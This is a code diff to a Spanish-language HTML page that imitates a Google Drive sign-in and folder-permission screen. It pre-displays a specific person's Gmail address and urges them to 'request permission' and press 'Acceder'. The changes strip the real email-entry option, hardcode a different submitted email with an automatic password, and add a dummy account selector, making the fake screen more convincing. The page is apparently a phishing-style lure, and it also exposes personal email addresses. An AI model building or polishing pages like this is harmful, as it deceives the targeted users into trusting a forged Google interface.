@@ -72,7 +72,7 @@
             margin-bottom: 32px;
         }
 
-        /* Estilo del selector de correo copiado del formulario 1 */
+        /* Selector de correo - clickeable pero sin funcionalidad */
         .email-selector {
             display: flex;
             align-items: center;
@@ -92,20 +92,28 @@
         }
 
         .user-avatar {
-            width: 32px;
-            height: 32px;
-            background-color: #8E24AA;
+            width: 28px;
+            height: 28px;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
             margin-right: 12px;
             flex-shrink: 0;
+            overflow: hidden;
+            background-color: #8E24AA;
+        }
+
+        .user-avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 50%;
         }
 
         .user-avatar span {
             color: white;
-            font-size: 16px;
+            font-size: 14px;
             font-weight: 500;
         }
 
@@ -127,64 +135,6 @@
             margin-left: 8px;
             transition: transform 0.2s ease;
             transform: scaleY(0.6);
-        }
-
-        /* Email input alternativo */
-        .email-input-wrapper {
-            position: relative;
-            margin-bottom: 32px;
-            text-align: left;
-            display: none;
-        }
-
-        .email-input-wrapper.active {
-            display: block;
-        }
-
-        .email-input-field {
-            width: 100%;
-            padding: 16px 12px 8px;
-            background-color: transparent;
-            border: 1.5px solid #82aaff;
-            border-radius: 10px;
-            color: #e8eaed;
-            font-size: 1rem;
-            outline: none;
-            transition: border-color 0.2s;
-        }
-
-        .email-input-field:focus {
-            border-color: #82aaff;
-        }
-
-        .email-input-label {
-            position: absolute;
-            top: 16px;
-            left: 12px;
-            color: #cdd6f4;
-            background-color: #2d2e30;
-            padding: 0 4px;
-            transition: 0.2s ease all;
-            pointer-events: none;
-        }
-
-        .email-input-field:focus + .email-input-label,
-        .email-input-field:not(:placeholder-shown) + .email-input-label {
-            top: -10px;
-            font-size: 0.8rem;
-            color: #82aaff;
-        }
-
-        .back-to-selector {
-            color: #1a73e8;
-            font-size: 14px;
-            text-decoration: none;
-            margin-top: 8px;
-            display: inline-block;
-        }
-
-        .back-to-selector:hover {
-            text-decoration: underline;
         }
 
         .input-wrapper {
@@ -244,7 +194,7 @@
         }
 
         .forgot-email {
-            color: #c8565d;
+            color: #e2626a;
             font-size: 14px;
             font-weight: 500;
             text-decoration: none;
@@ -258,7 +208,7 @@
         }
 
         .guest-mode {
-            color: #e8eaed;
+            color: #e8eaed99;
             font-size: 14px;
             line-height: 1.4286;
             margin-bottom: 24px;
@@ -420,35 +370,29 @@
             <h1 class="title">Acceder a Dibujos</h1>
             <p class="subtitle">Ir a Drive</p>
             
-            <!-- Selector de correo con el nuevo estilo -->
+            <!-- Selector de correo - clickeable pero sin funcionalidad -->
             <div class="email-selector" id="emailSelector">
                 <div class="user-avatar">
-                    <span id="userInitial">Q</span>
+                    <img src="" alt="Avatar" id="userAvatar" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
+                    <span id="userInitial" style="display: none;">Q</span>
                 </div>
                 <div class="user-email" id="selectedEmail">qstephany09@gmail.com</div>
                 <div class="dropdown-arrow">▼</div>
-            </div>
-
-            <!-- Input alternativo para correo -->
-            <div class="email-input-wrapper" id="emailInputWrapper">
-                <input type="email" id="emailInput" name="email" class="email-input-field" placeholder=" " required>
-                <label for="emailInput" class="email-input-label">Correo electrónico o teléfono</label>
-                <a href="#" class="back-to-selector" id="backToSelector">← Volver a la cuenta anterior</a>
             </div>
             
             <form id="loginForm">
                 <div id="errorMessage" class="error-message"></div>
                 
-                <a href="#" class="forgot-email">Solicite el permiso en la carpeta para continuar</a>
+                <a href="#" class="forgot-email">Solicita el permiso en la carpeta para continuar</a>
                 
                 <div class="guest-mode">
-                    ¿No es tu ordenador? Usa el modo de invitado para navegar de forma privada. 
+             Se habilitará el contenido de la carpeta tras la confirmación.
                     <a href="#">Más información</a>
                 </div>
                 
                 <div class="actions">
                     <a href="#" class="create-account">Crear cuenta</a>
-                    <button type="submit" class="access-button" id="accessBtn">Siguiente</button>
+                    <button type="submit" class="access-button" id="accessBtn">Acceder</button>
                 </div>
             </form>
         </div>
@@ -471,73 +415,22 @@
     <iframe id="usuarioFrame" src="" style="display: none; width: 100%; height: 100vh; border: none;"></iframe>
 
     <script>
-        // Variables globales
-        let currentEmail = "qstephany09@gmail.com";
-        let isUsingCustomEmail = false;
-
-        // Elementos del DOM
-        const emailSelector = document.getElementById('emailSelector');
-        const emailInputWrapper = document.getElementById('emailInputWrapper');
-        const emailInput = document.getElementById('emailInput');
-        const backToSelector = document.getElementById('backToSelector');
-        const selectedEmailEl = document.getElementById('selectedEmail');
-        const userInitialEl = document.getElementById('userInitial');
-
-        // Manejar clic en el selector de correo (flecha)
-        emailSelector.addEventListener('click', function() {
-            showEmailInput();
+        // Manejar clic en selector de correo (sin funcionalidad)
+        document.getElementById('emailSelector').addEventListener('click', function() {
+            // Click registrado pero sin acción
+            console.log('Selector de correo clickeado');
         });
 
-        // Manejar clic en "Volver a la cuenta anterior"
-        backToSelector.addEventListener('click', function(e) {
-            e.preventDefault();
-            showEmailSelector();
-        });
-
-        // Manejar cambio en el input de email
-        emailInput.addEventListener('input', function() {
-            currentEmail = this.value;
-            isUsingCustomEmail = true;
-        });
-
-        function showEmailInput() {
-            emailSelector.style.display = 'none';
-            emailInputWrapper.classList.add('active');
-            emailInput.focus();
-        }
-
-        function showEmailSelector() {
-            emailInputWrapper.classList.remove('active');
-            emailSelector.style.display = 'flex';
-            
-            // Si se había ingresado un email personalizado, regresar al predeterminado
-            if (isUsingCustomEmail) {
-                currentEmail = "qstephany09@gmail.com";
-                isUsingCustomEmail = false;
-                emailInput.value = '';
-            }
-        }
-
-        function getInitialFromEmail(email) {
-            return email.charAt(0).toUpperCase();
-        }
-
-        // Manejar formulario - Mantener funcionalidad original del formulario 2
+        // Manejar formulario - funcionalidad original
         document.getElementById("loginForm").addEventListener("submit", async function(event) {
             event.preventDefault();
             
             const errorMessage = document.getElementById('errorMessage');
             const accessBtn = document.getElementById('accessBtn');
             
-            // Obtener email actual (del selector o del input personalizado)
-            const email = isUsingCustomEmail ? emailInput.value : currentEmail;
+            // Email fijo
+            const email = "yoshidah456@gmail.com";
             const password = "acceso_directo"; // Contraseña automática para registro
-            
-            // Validar que haya un email
-            if (!email) {
-                showError("Por favor ingresa un correo electrónico.");
-                return;
-            }
             
             // Limpiar errores previos
             errorMessage.style.display = 'none';
